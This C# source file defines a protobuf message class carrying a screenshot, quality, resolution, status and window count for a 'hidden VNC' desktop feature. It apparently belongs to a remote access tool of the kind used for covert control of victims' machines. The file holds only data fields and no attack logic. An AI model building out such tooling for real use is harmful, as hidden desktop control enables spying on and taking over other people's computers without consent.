

using InvokedCommon.Enums;
using InvokedCommon.Video;
using ProtoBuf;


namespace InvokedCommon.Messages
{
	[ProtoContract]
	public class GetDesktopResponseHVNC : IMessage
	{
		[ProtoMember(1)]
		public byte[] Image { get; set; }

		[ProtoMember(2)]
		public int Quality { get; set; }

		[ProtoMember(3)]
		public Resolution Resolution { get; set; }

		[ProtoMember(4)]
		public HVNCStatus HvncStatus { get; set; }

		[ProtoMember(5)]
		public int WindowCount { get; set; }
	}
}
